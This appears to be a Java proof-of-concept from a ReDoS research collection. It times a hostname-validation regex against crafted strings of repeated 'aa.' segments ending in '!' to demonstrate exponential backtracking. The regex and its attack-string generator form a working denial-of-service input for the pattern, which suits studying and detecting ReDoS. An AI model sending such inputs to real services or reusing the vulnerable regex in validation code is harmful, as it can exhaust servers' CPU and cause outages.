//vuln pattern: EOD
//vuln degree: EXP
//mul vuln: N
//vuln location: (?:(?!\.|-)([a-z0-9\-\*]{1,63}|([a-z0-9\-]{1,62}[a-z0-9]))\.)+

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Demo {

    public static void main(String[] args) throws InterruptedException {
        String regex = "^(?=^.{1,254}$)(^(?:(?!\\.|-)([a-z0-9\\-\\*]{1,63}|([a-z0-9\\-]{1,62}[a-z0-9]))\\.)+(?:[a-z]{2,})$)$";
        for (int i = 0; i < 1000; i++) {
            StringBuilder attackString = new StringBuilder();
            // 前缀
            attackString.append("a");
            // 歧义点
            for (int j = 0; j < i ; j++) {
                attackString.append("aa.");
            }
            // 后缀
            attackString.append("!");
            long time1 = System.nanoTime();
            Matcher matcher = Pattern.compile(regex).matcher(attackString);
            boolean isMatch = matcher.find();
//            boolean isMatch = Pattern.matches(regex, attackString);
            long time2 = System.nanoTime();
            System.out.println(attackString.length() + " " + isMatch + " "+ (time2 - time1)/1e9+"s");

        }
    }







}
